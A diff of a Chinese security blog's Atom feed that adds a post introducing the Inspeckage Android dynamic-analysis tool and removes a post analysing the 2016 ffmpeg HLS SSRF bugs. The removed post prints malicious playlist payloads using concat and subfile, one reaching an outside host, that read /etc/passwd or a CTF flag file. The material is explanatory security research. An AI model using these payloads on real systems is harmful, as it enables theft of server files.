@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-05-26T14:05:32.000Z</updated>
+  <updated>2016-08-09T07:12:40.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,48 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[安卓分析辅助工具Inspeckage介绍]]></title>
+    <link href="http://xdxd.love/2016/08/09/%E5%AE%89%E5%8D%93%E5%88%86%E6%9E%90%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7Inspeckage%E4%BB%8B%E7%BB%8D/"/>
+    <id>http://xdxd.love/2016/08/09/安卓分析辅助工具Inspeckage介绍/</id>
+    <published>2016-08-09T07:12:04.000Z</published>
+    <updated>2016-08-09T07:12:40.000Z</updated>
+    <content type="html"><![CDATA[<p>Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。</p>
+<p>可以参考:<br><a href="http://repo.xposed.info/module/mobi.acpm.inspeckage" target="_blank" rel="external">Inspeckage - Android Package Inspector</a></p>
+<p>Inspeckage的安装就不赘述了，参考xposed框架的安装以及使用。下面主要介绍一下Inspeckage的功能和使用。</p>
+<p>安装之后，可以在桌面上看到inspeckage的图标。点开之后主界面如下：</p>
+<p><img src="/images/inspeckage3.png" alt="image"></p>
+<p>在choose target下拉列表中选择要分析的app，这里以乌云峰会puzzle1中的apk为例进行介绍。然后在电脑的terminal中执行</p>
+<p><code>adb forward tcp:8008 tcp:8008</code></p>
+<p>转发手机的8008端口到本地。在电脑上访问<a href="http://127.0.0.1:8008" target="_blank" rel="external">http://127.0.0.1:8008</a> 就可以看到inspeckage的web界面了。</p>
+<p><img src="/images/inspeckage5.png" alt="image"></p>
+<p>如图所示，inspeckage提供了对所分析apk的一些基本信息，提供直接下载apk到电脑，截图手机屏幕等辅助功能，最核心的功能是监控share preferences，加解密函数的使用，http访问等。下面一一分析。</p>
+<p>设置选项中，提供了ssl uncheck，设置代理等。经过测试发现SSL uncheck效果一般。https流量依然很多抓不到。</p>
+<p><img src="/images/inspeckage6.png" alt="image"></p>
+<p>使用logcat功能需要先转发端口到本地。<code>adb forward tcp:8887 tcp:8887</code></p>
+<p>点击start，再点connect就可以在网页中实时查看该app的logcat输出。</p>
+<p><img src="/images/inspeckage8.png" alt="image"></p>
+<p>Tree view按钮可以实时浏览app的数据目录并直接下载文件到本地。</p>
+<p><img src="/images/inspeckage7.png" alt="image"></p>
+<p>wooyun这个puzzle的writeup中是使用smali插桩的方式打印出了aes加密的密钥。</p>
+<p><img src="/images/inspeckage10.png" alt="image"></p>
+<p>如果采用inspeckage来分析的话，直接在crypto记录中就可以看到。</p>
+<p><img src="/images/inspeckage11.png" alt="image"></p>
+<p>由于这个apk采用的md5方法是写在so中的，所以inspeckage的hash记录中并没有相关的记录。这个可以采用hook自定义函数的方式来解决。<br>反编译apk，找到调用so的方法为getPart2，同理其实也可以手动hookgetPart1。<br><img src="/images/inspeckage12.png" alt="image"></p>
+<p>设置好hook的方法后，重启app生效。</p>
+<p><img src="/images/inspeckage13.png" alt="image"></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。</p>
+<p>可以参考:<br><a href="http://repo.xp]]>
+    </summary>
+    
+      <category term="inspeckage" scheme="http://xdxd.love/tags/inspeckage/"/>
+    
+      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[一个任意文件读取漏洞记录]]></title>
@@ -1065,58 +1107,6 @@ class <sp]]>
       <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
     
       <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[ffmpeg SSRF漏洞分析]]></title>
-    <link href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://xdxd.love/2016/01/18/ffmpeg-SSRF漏洞分析/</id>
-    <published>2016-01-18T10:41:41.000Z</published>
-    <updated>2016-03-15T07:03:03.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">这个文章</a>，但是俄语看不懂，google翻译也没看懂。中文的相关报道都是来自<a href="http://www.solidot.org/story?sid=46891" target="_blank" rel="external">solidot</a>15日的这个简短报道。<br><img src="/images/ffmpegssrf1.png" alt=""></p>
-<p>而ffmpeg得反应很快，1月16日就发布了修复版本。</p>
-<p><img src="/images/ffmpegssrf2.png" alt=""></p>
-<h1 id="漏洞影响">漏洞影响</h1><p>如果ffmpeg解析了一个恶意的文件，会导致本地的文件信息泄露。受影响的出了ctf中这个在线视频格式转换的服务外，如果是采用ffmpeg了客户端如果可以输入恶意文件也会造成本地文件信息泄露。</p>
-<h1 id="漏洞分析">漏洞分析</h1><p>change log中提到了两个CVE CVE-2016-1897和CVE-2016-1898。</p>
-<h2 id="CVE-2016-1897">CVE-2016-1897</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a> )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
-<pre><code><span class="preprocessor">#EXTM3U</span>
-<span class="preprocessor">#EXT-X-MEDIA-SEQUENCE:0</span>
-<span class="preprocessor">#EXTINF:10.0,</span>
-concat:http:<span class="comment">//dx.su/header.m3u8|file:///etc/passwd</span>
-<span class="preprocessor">#EXT-X-ENDLIST</span>
-</code></pre><h2 id="CVE-2016-1898">CVE-2016-1898</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
-<pre><code><span class="comment">#EXTM3U</span>
-<span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span>
-<span class="comment">#EXTINF:10.0,</span>
-<span class="symbol">concat:</span><span class="symbol">http:</span>/<span class="regexp">/localhost/header</span>.m3u8|subfile,,start,<span class="number">0</span>,<span class="keyword">end</span>,<span class="number">64</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">64</span>,<span class="keyword">end</span>,<span class="number">128</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">128</span>,<span class="keyword">end</span>,<span class="number">256</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">256</span>,<span class="keyword">end</span>,<span class="number">512</span>,,<span class="symbol">:///etc/passwd</span>
-<span class="comment">#EXT-X-ENDLIST</span>
-</code></pre><h1 id="CTF">CTF</h1><p>比较有意思的是查资料的过程中发现了这篇文章<a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">9447 CTF 2015: Super Turbo Atomic GIF Converter</a></p>
-<p>可以看到以下几个方式可以读取文件:</p>
-<pre><code><span class="id">#EXTM3U</span>
-<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
-<span class="id">#EXTINF</span>:<span class="number">1</span>,
-/home/ctf/flag<span class="class">.txt</span>
-<span class="id">#EXT-X-ENDLIST</span>
-
-<span class="id">#EXTM3U</span>
-<span class="id">#EXT-X-PLAYLIST-TYPE</span>:VOD
-<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
-<span class="id">#EXT-X-VERSION</span>:<span class="number">3</span>
-<span class="id">#EXT-X-MEDIA-SEQUENCE</span>:<span class="number">0</span>
-<span class="id">#EXTINF</span>:<span class="number">10.0</span>,
-file:<span class="comment">///home/ctf/flag.txt</span>
-#EXT-X-ENDLIST
-</code></pre><p>以及这里cve的concat方式。利用0day做ctf也是高端。</p>
-<h1 id="参考资料">参考资料</h1><p><a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">通过 ffmpeg 的播放列表实现 SSRF 以及窃取文件</a><br><a href="http://seclists.org/oss-sec/2016/q1/85" target="_blank" rel="external">http://seclists.org/oss-sec/2016/q1/85</a><br><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897" target="_blank" rel="external">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a><br><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter</a><br><a href="http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html" target="_blank" rel="external">http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html</a><br><a href="https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter" target="_blank" rel="external">https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter</a><br><a href="http://pastebin.com/FrsQinQz" target="_blank" rel="external">http://pastebin.com/FrsQinQz</a><br><a href="https://gist.github.com/Invizory/e45e1ee54cf0687f2002" target="_blank" rel="external">https://gist.github.com/Invizory/e45e1ee54cf0687f2002</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">]]>
-    </summary>
-    
-      <category term="ffmpeg" scheme="http://xdxd.love/tags/ffmpeg/"/>
-    
-      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
